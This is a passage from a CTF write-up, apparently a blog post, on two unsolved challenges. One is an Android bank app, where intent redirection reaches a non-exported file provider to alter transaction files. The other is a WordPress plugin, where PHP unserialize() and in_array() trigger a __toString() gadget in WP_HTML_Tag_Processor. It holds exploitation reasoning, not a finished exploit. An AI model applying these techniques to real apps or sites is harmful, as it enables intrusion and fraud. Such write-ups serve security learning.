        <span class="o">}</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Loaded "</span> <span class="o">+</span> <span class="n">arrayList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">" transactions"</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">arrayList</span><span class="o">;</span>
    <span class="o">}</span>
    
    <span class="kd">private</span> <span class="nc">DelayedTransaction</span> <span class="nf">readTransactionFromFile</span><span class="o">(</span><span class="nc">File</span> <span class="n">file</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">FileReader</span> <span class="n">fileReader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="nc">DelayedTransaction</span> <span class="n">delayedTransaction</span> <span class="o">=</span> <span class="o">(</span><span class="nc">DelayedTransaction</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">gson</span><span class="o">.</span><span class="na">fromJson</span><span class="o">((</span><span class="nc">Reader</span><span class="o">)</span> <span class="n">fileReader</span><span class="o">,</span> <span class="nc">DelayedTransaction</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
                <span class="n">fileReader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="k">return</span> <span class="n">delayedTransaction</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="no">TAG</span><span class="o">,</span> <span class="s">"Failed to read file: "</span> <span class="o">+</span> <span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">e</span><span class="o">);</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the getAllTransactions() method calls the readTransactionFromFile() method to read transactions; therefore, the scheduled transactions are written to a file</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">FOLDER_NAME</span> <span class="o">=</span> <span class="s">"delayed_transactions"</span><span class="o">;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the files are  located under the delayed_transactions folder</p>

<p><a href="/assets/img/2025/sekaiCTF/6.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/6.png" alt="" loading="lazy"></a></p>

<p>when i check the delayed_transactions  folder, i could find a json file which keys amount, toUsername, scheduledTime were present</p>

<p>however, i wasn’t able to exploit it since i didn’t know what to do, so i eventually gave up</p>

<h3 id="after-ctf"><span class="me-2">After CTF</span><a href="#after-ctf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>        <span class="nt">&lt;provider</span>
            <span class="na">android:name=</span><span class="s">"com.sekai.bank.providers.LogProvider"</span>
            <span class="na">android:enabled=</span><span class="s">"true"</span>
            <span class="na">android:exported=</span><span class="s">"false"</span>
            <span class="na">android:authorities=</span><span class="s">"com.sekai.bank.logprovider"</span>
            <span class="na">android:grantUriPermissions=</span><span class="s">"true"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;meta-data</span>
                <span class="na">android:name=</span><span class="s">"android.support.FILE_PROVIDER_PATHS"</span>
                <span class="na">android:resource=</span><span class="s">"@xml/file_paths"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/provider&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>there is a LogProvider that is not exported</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>    <span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
    <span class="kd">public</span> <span class="nc">ParcelFileDescriptor</span> <span class="nf">openFile</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">FileNotFoundException</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="s">"Invalid path!"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">getContext</span><span class="o">().</span><span class="na">getCacheDir</span><span class="o">(),</span> <span class="n">uri</span><span class="o">.</span><span class="na">getPath</span><span class="o">());</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="s">"Log doesn't exists!"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="nc">ParcelFileDescriptor</span><span class="o">.</span><span class="na">open</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="mi">805306368</span><span class="o">);</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the provider exposes the openFile() function, which calls the ParcelFileDescriptor.open() method with the 805306368 flag. this flag corresponds to MODE_READ_WRITE | MODE_CREATE | MODE_TRUNCATE, which means the file can be read and written. as a result, wthe scheduled transaction file can be modified via this logic</p>

<p>however, logProvider  is not exported so actually it cannot be called from outside the application</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>    <span class="nd">@Override</span> <span class="c1">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">tokenManager</span> <span class="o">=</span> <span class="nc">SekaiApplication</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">getTokenManager</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">handlePinSetupFlow</span><span class="o">())</span> <span class="o">{</span>
                <span class="k">return</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Intent</span><span class="o">)</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"fallback"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">intent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
                <span class="n">finish</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">uiInitialized</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">checkAuthentication</span><span class="o">();</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>however when we send the intent as a string via the callback extra, the try statement will fail, and the intent will be executed internally so we will able to call the LogProvider  so we should modify the scheduled transaction (amount=1M, toUsername=Solver, scheduledTime=now or later) to solve</p>

<hr />
<h2 id="fancy-web-unsolved"><span class="me-2">Fancy Web (Unsolved)</span><a href="#fancy-web-unsolved" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>the fancy web challenge is built on wordpress, with a custom plugin called fancy</p>

<h3 id="fancy-plugins"><span class="me-2">fancy plugins</span><a href="#fancy-plugins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre>    <span class="c1">// Process User Input</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'generate'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"&lt;h2&gt;🎯 User Generated Table&lt;/h2&gt;"</span><span class="p">;</span>
            
            <span class="c1">// Check if user wants to unserialize existing data</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'serialized_data'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"&lt;h3&gt;Attempting to unserialize user data...&lt;/h3&gt;"</span><span class="p">;</span>
                
                <span class="nv">$userBase64Data</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'serialized_data'</span><span class="p">]);</span>
                <span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;strong&gt;Base64 Input Data:&lt;/strong&gt; "</span> <span class="mf">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$userBase64Data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"...&lt;/p&gt;"</span><span class="p">;</span>
                
                <span class="c1">// Decode base64 first</span>
                <span class="nv">$userSerializedData</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$userBase64Data</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                
                <span class="k">if</span> <span class="p">(</span><span class="nv">$userSerializedData</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"&lt;p style='color: red;'&gt;&lt;strong&gt;❌ Invalid base64 encoding&lt;/strong&gt;&lt;/p&gt;"</span><span class="p">;</span>
                    <span class="k">echo</span> <span class="s2">"&lt;p&gt;Please provide valid base64 encoded serialized data.&lt;/p&gt;"</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;strong&gt;Decoded Serialized Data:&lt;/strong&gt; "</span> <span class="mf">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$userSerializedData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">150</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"...&lt;/p&gt;"</span><span class="p">;</span>
                    
                    <span class="c1">// Attempt to unserialize user input</span>
                    <span class="nv">$userTable</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$userSerializedData</span><span class="p">);</span>
                    
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$userTable</span> <span class="k">instanceof</span> <span class="nc">SecureTableGenerator</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"&lt;p style='color: green;'&gt;&lt;strong&gt;✅ Successfully unserialized user data!&lt;/strong&gt;&lt;/p&gt;"</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s2">"&lt;p&gt;&lt;em&gt;Note: __wakeup() method automatically secured the data&lt;/em&gt;&lt;/p&gt;"</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="nv">$userTable</span><span class="o">-&gt;</span><span class="nf">generateTable</span><span class="p">();</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"&lt;p style='color: red;'&gt;&lt;strong&gt;❌ Failed to unserialize data or invalid object type&lt;/strong&gt;&lt;/p&gt;"</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Please provide valid SecureTableGenerator serialized data.&lt;/p&gt;"</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span> 
</pre></td></tr></tbody></table></code></div></div>
<p>when a user sends a reqeust containing the serialized_data in the body, it is passed to the unserialize() function, during this process, if the object being deserialized defines a __wakeup() method, that method will typically be called automatically</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre></td><td class="rouge-code"><pre> <span class="cd">/**
 * SecureTableGenerator - A serializable class for creating beautiful HTML tables
 * Features security measures to prevent common serialization attacks, made with vibe coding.
 */</span>
<span class="kd">class</span> <span class="nc">SecureTableGenerator</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$headers</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$tableClass</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$allowedTags</span><span class="p">;</span>

    <span class="c1">// (...)</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Complex validation timestamp check</span>
        <span class="nv">$wakeupStartTime</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
        
        <span class="c1">// Security: Check for object injection attacks</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">validateObjectIntegrity</span><span class="p">();</span>
        
        <span class="c1">// Deep property validation with complex logic</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">performComplexValidation</span><span class="p">();</span>
        
        <span class="c1">// Multi-layer sanitization process</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">executeAdvancedSanitization</span><span class="p">();</span>
        
        <span class="c1">// Security rate limiting simulation</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">implementSecurityThrottling</span><span class="p">();</span>
        
        <span class="c1">// Complex data normalization</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">normalizeDataStructure</span><span class="p">();</span>
        
        <span class="c1">// Advanced security checks</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">performAdvancedSecurityChecks</span><span class="p">();</span>
        
        <span class="c1">// Reset security properties with validation</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">resetSecurityProperties</span><span class="p">();</span>
        
        <span class="c1">// Log wakeup completion time for security monitoring</span>
        <span class="nv">$wakeupEndTime</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">logSecurityEvent</span><span class="p">(</span><span class="nv">$wakeupStartTime</span><span class="p">,</span> <span class="nv">$wakeupEndTime</span><span class="p">);</span>
    <span class="p">}</span>


</pre></td></tr></tbody></table></code></div></div>
<p>the securetablegenerator class defines a __wakeup() method which in turn calls several methods such as validateObjectIntegrity, performComplexValidation and others. so when we send the reqeust containing the serialized_data in the body, the __wakeup() method will be called</p>

<blockquote>
  <p>btw, hint 1 suggests taking a close look at in_array blah blah…</p>
</blockquote>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>    <span class="k">private</span> <span class="k">function</span> <span class="n">resetSecurityProperties</span><span class="p">()</span>
    <span class="p">{</span>
        
        <span class="c1">// Validate allowed tags</span>
        <span class="nv">$safeTags</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'b'</span><span class="p">,</span> <span class="s1">'i'</span><span class="p">,</span> <span class="s1">'strong'</span><span class="p">,</span> <span class="s1">'em'</span><span class="p">,</span> <span class="s1">'u'</span><span class="p">,</span> <span class="s1">'span'</span><span class="p">,</span> <span class="s1">'div'</span><span class="p">,</span> <span class="s1">'p'</span><span class="p">];</span>
        <span class="nv">$validatedTags</span> <span class="o">=</span> <span class="p">[];</span>
        
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">allowedTags</span> <span class="k">as</span> <span class="nv">$tag</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tag</span><span class="p">,</span> <span class="nv">$safeTags</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$validatedTags</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$tag</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">allowedTags</span> <span class="o">=</span> <span class="nv">$validatedTags</span> <span class="o">?:</span> <span class="p">[</span><span class="s1">'b'</span><span class="p">,</span> <span class="s1">'i'</span><span class="p">,</span> <span class="s1">'strong'</span><span class="p">,</span> <span class="s1">'em'</span><span class="p">,</span> <span class="s1">'u'</span><span class="p">];</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>digging deeper, i found the call to in_array() within the resetSecurityProperties() method</p>

<p>in PHP, when an object is used in a string context (such as during comparison or output), its __toString() method is automatically called. According to the official php documentation, if a class is treated as a string, the __toString() method of that class will be called</p>

<p>in this case, $this-&gt;allowedTags is an object, and whenever it is handled as a string, the __toString() method is called. this behavior allows us to leverage the __toString() method of specific WordPress classes for exploitation</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">Demo</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__toString</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"__toString() called!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="k">return</span> <span class="s2">"hello"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Demo</span><span class="p">();</span>
<span class="nv">$safeTags</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'b'</span><span class="p">,</span> <span class="s1">'i'</span><span class="p">,</span> <span class="s1">'strong'</span><span class="p">,</span> <span class="s1">'em'</span><span class="p">,</span> <span class="s1">'u'</span><span class="p">,</span> <span class="s1">'span'</span><span class="p">,</span> <span class="s1">'div'</span><span class="p">,</span> <span class="s1">'p'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$obj</span><span class="p">,</span> <span class="nv">$safeTags</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Match found!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"No match!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cm">/*
__toString() called!
__toString() called!
__toString() called!
__toString() called!
__toString() called!
__toString() called!
__toString() called!
__toString() called!
No match!
*/</span>
</pre></td></tr></tbody></table></code></div></div>
<p>i wrote a simple poc code to test whether the __toString() method would be called when the class is treated as a string. and the result confirmed that __toString() is indeed called</p>

<p>but in order to exploit this behavior, we need to find another class within wordPress that actually implements a __toString() method</p>

<p><a href="/assets/img/2025/sekaiCTF/7.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/7.png" alt="" loading="lazy"></a></p>

<p>i found a class that implements a __toString() method in the wordpress folder</p>

<h3 id="wp_html_tag_processor"><span class="me-2">WP_HTML_Tag_Processor</span><a href="#wp_html_tag_processor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>	<span class="k">public</span> <span class="k">function</span> <span class="n">__toString</span><span class="p">():</span> <span class="kt">string</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get_updated_html</span><span class="p">();</span>
	<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>most of the __toString() methods i found only perform simple logic, such as returning md5(serialize($this)), without calling any additional methods that could lead to a new execution path. however, in the WP_HTML_Tag_Processor class, the __toString() method calls get_updated_html(.</p>

<p>this means we can use the resetSecurityProperties() method to trigger the __toString() method of the WP_HTML_Tag_Processor class</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre>	<span class="k">public</span> <span class="k">function</span> <span class="n">get_updated_html</span><span class="p">():</span> <span class="kt">string</span> <span class="p">{</span>
		<span class="nv">$requires_no_updating</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">===</span> <span class="nb">count</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">classname_updates</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="mi">0</span> <span class="o">===</span> <span class="nb">count</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">lexical_updates</span> <span class="p">);</span>

		<span class="cm">/*
		 * When there is nothing more to update and nothing has already been
		 * updated, return the original document and avoid a string copy.
		 */</span>
		<span class="k">if</span> <span class="p">(</span> <span class="nv">$requires_no_updating</span> <span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">html</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="cm">/*
		 * Keep track of the position right before the current tag. This will
		 * be necessary for reparsing the current tag after updating the HTML.
		 */</span>
		<span class="nv">$before_current_tag</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">token_starts_at</span> <span class="o">??</span> <span class="mi">0</span><span class="p">;</span>

		<span class="cm">/*
		 * 1. Apply the enqueued edits and update all the pointers to reflect those changes.
		 */</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">class_name_updates_to_attributes_updates</span><span class="p">();</span>
		<span class="nv">$before_current_tag</span> <span class="o">+=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">apply_attributes_updates</span><span class="p">(</span> <span class="nv">$before_current_tag</span> <span class="p">);</span>

		<span class="cm">/*
		 * 2. Rewind to before the current tag and reparse to get updated attributes.
		 *
		 * At this point the internal cursor points to the end of the tag name.
		 * Rewind before the tag name starts so that it's as if the cursor didn't
		 * move; a call to `next_tag()` will reparse the recently-updated attributes
		 * and additional calls to modify the attributes will apply at this same
		 * location, but in order to avoid issues with subclasses that might add
		 * behaviors to `next_tag()`, the internal methods should be called here
		 * instead.
		 *
		 * It's important to note that in this specific place there will be no change
		 * because the processor was already at a tag when this was called and it's
		 * rewinding only to the beginning of this very tag before reprocessing it
		 * and its attributes.
		 *
		 * &lt;p&gt;Previous HTML&lt;em&gt;More HTML&lt;/em&gt;&lt;/p&gt;
		 *                 ↑  │ back up by the length of the tag name plus the opening &lt;
		 *                 └←─┘ back up by strlen("em") + 1 ==&gt; 3
		 */</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">bytes_already_parsed</span> <span class="o">=</span> <span class="nv">$before_current_tag</span><span class="p">;</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">base_class_next_token</span><span class="p">();</span>

		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">html</span><span class="p">;</span>
	<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the get_updated_html() method looks like the snippet shown above, and within it, the class_name_updates_to_attributes_updates() method is called</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>	<span class="k">private</span> <span class="k">function</span> <span class="n">class_name_updates_to_attributes_updates</span><span class="p">():</span> <span class="kt">void</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="nb">count</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">classname_updates</span> <span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="nv">$existing_class</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">get_enqueued_attribute_value</span><span class="p">(</span> <span class="s1">'class'</span> <span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span> <span class="kc">null</span> <span class="o">===</span> <span class="nv">$existing_class</span> <span class="o">||</span> <span class="kc">true</span> <span class="o">===</span> <span class="nv">$existing_class</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$existing_class</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span> <span class="kc">false</span> <span class="o">===</span> <span class="nv">$existing_class</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">attributes</span><span class="p">[</span><span class="s1">'class'</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$existing_class</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span>
				<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">html</span><span class="p">,</span>
